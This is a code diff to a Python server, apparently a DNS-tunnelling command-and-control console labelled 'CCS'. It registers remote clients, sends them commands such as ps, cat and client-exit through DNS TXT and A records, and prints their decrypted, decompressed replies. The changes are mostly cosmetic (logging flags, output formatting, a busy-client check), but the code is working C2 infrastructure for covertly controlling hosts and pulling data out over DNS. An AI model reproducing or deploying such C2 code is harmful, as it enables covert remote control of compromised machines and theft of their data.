@@ -44,7 +44,7 @@ class Server:
 
     def __init__(self, args):
         self.password = args.password
-        self.silent = args.silent
+        self.verbose = args.verbose
         self.listening_port = args.port
         self.listening_ip = args.ip
 
@@ -58,7 +58,7 @@ class Server:
         self.running = False
 
     def __log(self, message):
-        if self.silent:
+        if not self.verbose:
             return
         print("CCS: {}".format(message))
 
@@ -116,6 +116,8 @@ class Server:
                 command = serv_to_client["RST"]
                 self.commands_for_clients[addr].completed = False
                 self.commands_for_clients[addr].segments = []
+            else:
+                print("-- {}: Answered! Refresh to show it.".format(addr))
 
         repl = request.reply()
         repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
@@ -138,7 +140,7 @@ class Server:
             uncompressed = zlib.decompress(deciphered)
             self.commands_for_clients[addr].segments = uncompressed.decode("utf-8")
         except Exception as e:
-            print("Error while processing data from {}: {}".format(addr, e))
+            print("-- Error while processing data from {}: {}".format(addr, e))
             return False
         return True
 
@@ -166,7 +168,7 @@ class Server:
 
         if new_one:
             # We register a new client
-            print("New client {} registered!".format(addr))
+            print("-- New client {} registered!".format(addr))
             self.commands_for_clients[addr] = Command(addr)
             command = "ACK"
 
@@ -187,7 +189,6 @@ class Server:
                 command = self.commands_for_clients[addr].command
                 args = self.commands_for_clients[addr].arg
 
-
         # Sanity check
         if command is None:
             self.__log("{}: Cannot reply with None message!".format(addr))
@@ -195,10 +196,9 @@ class Server:
 
         reply = request.reply()
         self.__log("{}: Sending {} command...".format(addr, command))
-        reply.add_answer(*RR.fromZone('{} 60 IN TXT {}'.format(client_to_serv["HB"], serv_to_client[command])))
+        reply.add_answer(RR(client_to_serv["HB"], QTYPE.TXT, rdata=TXT(serv_to_client[command]), ttl=60))
         if args is not None:
-            reply.add_answer(*RR.fromZone('{} 60 IN TXT "{}"'.format(client_to_serv["HB"], args)))
-
+            reply.add_answer(RR(client_to_serv["HB"], QTYPE.TXT, rdata=TXT(args), ttl=60))
         return reply
 
     def cleanup_connected(self):
@@ -221,8 +221,10 @@ class Server:
         for addr in self.commands_for_clients:
             if self.commands_for_clients[addr].completed and self.commands_for_clients[addr].started and type(
                     self.commands_for_clients[addr].segments) == str:
-                print("Reply from {} for request: {}:".format(addr, self.commands_for_clients[addr].command))
+                print("\n~~~~~~~~~~~~~~~~\nReply from {} for request: {}:".format(addr, self.commands_for_clients[
+                    addr].command))
                 print(self.commands_for_clients[addr].segments)
+                print("~~~~~~~~~~~~~~~~")
                 self.commands_for_clients[addr].started = False
 
         try:
@@ -234,7 +236,7 @@ class Server:
             self.cleanup_connected()
             print("\n================")
             # Select IP to give commands to:
-            print("0: Rescan")
+            print("0: Refresh")
             addresses = list(self.connected_clients.keys())
             for i in range(len(addresses)):
                 print("{}: {} {}".format(i + 1, addresses[i],
@@ -247,6 +249,9 @@ class Server:
                 # Compensate for the rescan option
                 selected_ip -= 1
             tar_addr = list(self.connected_clients.keys())[selected_ip]
+            if not self.commands_for_clients[tar_addr].completed:
+                print("You have selected a busy client! Try again when it finishes its task.")
+                return
 
             print("\n================")
             # Select command:
@@ -255,7 +260,7 @@ class Server:
             print("3: ps")
             print("4: cat")
             print("5: nop")
-            print("6: shutdown")
+            print("6: client-exit")
             print("7: exit")
 
             command = int(input("Command number: \n================\n"))
@@ -310,10 +315,9 @@ if __name__ == '__main__':
     parser = ArgumentParser()
     parser.add_argument("-pass", "--password", help="The password used to encrypt the communication", type=str,
                         default="heslo")
-    parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
+    parser.add_argument("-v", "--verbose", help="Show detailed debug info", type=bool, default=False)
     parser.add_argument("-ip", "--ip", help="Server IP", type=str, default="127.0.0.1")
-    parser.add_argument("-p", "--port", help="Port for the server to run on", type=int,
-                        default=51271)  # TODO: Arbitrary...
+    parser.add_argument("-p", "--port", help="Port of this server", type=int, default=51271)
     args = parser.parse_args()
 
     server = Server(args)
